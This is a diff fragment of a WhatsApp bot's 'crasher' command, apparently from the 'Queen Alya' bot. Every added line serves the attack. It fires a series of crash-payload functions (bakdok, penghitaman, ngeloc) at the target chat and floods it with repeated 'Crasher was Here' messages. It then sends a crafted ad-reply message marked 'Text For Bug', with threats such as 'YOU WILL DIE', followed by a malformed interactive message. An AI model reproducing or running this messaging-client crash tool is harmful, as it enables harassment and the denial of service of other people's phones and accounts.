+    await sendPaymentInfoMessage(m.chat, zpay)
+    await bakdok(m.chat, Alyabug)
+    await sendPaymentInfoMessage(m.chat, force2)
+    await penghitaman(m.chat, painbug)
+    await sendPaymentInfoMessage(m.chat, force)
+    await sendPaymentInfoMessage(m.chat, painbug)
+    await ngeloc(m.chat, force2)
+    AlyaBotInc.sendMessage(m.chat, {text: `\`𝐀𝐋𝐘𝐀 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐰𝐚𝐬 𝐇𝐞𝐫𝐞\``}, {quoted: m})
+    AlyaBotInc.sendMessage(m.chat, {text: `\`𝐀𝐋𝐘𝐀 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐰𝐚𝐬 𝐇𝐞𝐫𝐞\``}, {quoted: m})
+    AlyaBotInc.sendMessage(m.chat, {text: `\`𝐀𝐋𝐘𝐀 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐰𝐚𝐬 𝐇𝐞𝐫𝐞\``}, {quoted: m})
+    AlyaBotInc.sendMessage(m.chat, {text: `\`𝐀𝐋𝐘𝐀 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐰𝐚𝐬 𝐇𝐞𝐫𝐞\``}, {quoted: m})
+    await sendPaymentInfoMessage(m.chat)
+    await sendPaymentInfoMessage(m.chat, force2)
+    await bakdok(m.chat, Alyabug)
+  }
+
+  await AlyaBotInc.sendMessage(m.chat, {
+    contextInfo: {
+      mentionedJid: ['00000@s.whatsapp.net'],
+      externalAdReply: {
+        showAdAttribution: false,
+        renderLargerThumbnail: false,
+        jpegThumbnail: fakejpg,
+        title: "𝐐𝐮𝐞𝐞⃟𝐧 ⃟𝐀𝐥𝐲𝐚",
+        body: `⁗ ⋄ 𝐘𝐎𝐔 𝐖𝐈𝐋𝐋 𝐃𝐈𝐄!! `,
+        previewType: "VIDEO",
+        sourceUrl: `💫 𝐐𝐮𝐞𝐞𝐧𖤛𝐀𝐥𝐲𝐚 ║║ 𝐕𝐈𝐑𝐔𝐒 𖢉`,
+        mediaType: 1,
+        mediaUrl: `${global.url}`
+      }
+    }, //Text For Bug
+    text: '𝐈 𝐀𝐋𝐎𝐍𝐄 𝐈𝐌 𝐓𝐇𝐄 𝐇𝐎𝐍𝐎𝐔𝐑𝐄𝐃 𝐎𝐍𝐄 \n𝐀𝐋𝐘𝐀 𝐈𝐒 𝐒𝐔𝐏𝐑𝐄𝐌𝐄'
+  }, {
+    quoted: null
+  })
+   await sleep(2000)
+let msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            "messageContextInfo": {
+                "deviceListMetadata": {},
+                "deviceListMetadataVersion": 2
+            },
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+                body: proto.Message.InteractiveMessage.Body.create({
+                    text: ''
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: "> Queen Alya Crasher"
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                    title: `⸙ 𝐐𝐮𝐞𝐞⃟𝐧 ⃟𝐀𝐥𝐲𝐚 𝐖𝐢𝐥𝐥 𝐄𝐫𝐚𝐝𝐢𝐜𝐚𝐭𝐞 𝐄𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠!
+
+𝐐𝐮𝐞𝐞⃟𝐧 ⃟𝐀𝐥𝐲𝐚`,
+                    subtitle: "Alya is Queen",
+                    hasMediaAttachment: true,
+                    ...(await prepareWAMessageMedia(
+                        {
+                            image: { url: randomImage }
+                        },
+                        { upload: Rias.waUploadToServer }
+                    ))
+                }),
+                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [
+                        {
+                            "name": "quick_reply",
+                            "buttonParamsJson": `{\"display_text\":\"🥶 ࿖ 𝐐𝐮𝐞𝐞⃟𝐧 ⃟𝐀𝐥𝐲𝐚\",\"id\":\".king\"}`
+                        }
+                    ],
+                })
+            })
+        }
+    }
+}, {})
+
+await AlyaBotInc.relayMessage(
+    msg.key.remoteJid,
+    msg.message,
+    { messageId: msg.key.id }
+)
 break
 case 'x2': {
 if (!isPremium) return replygcalya(mess.prem)
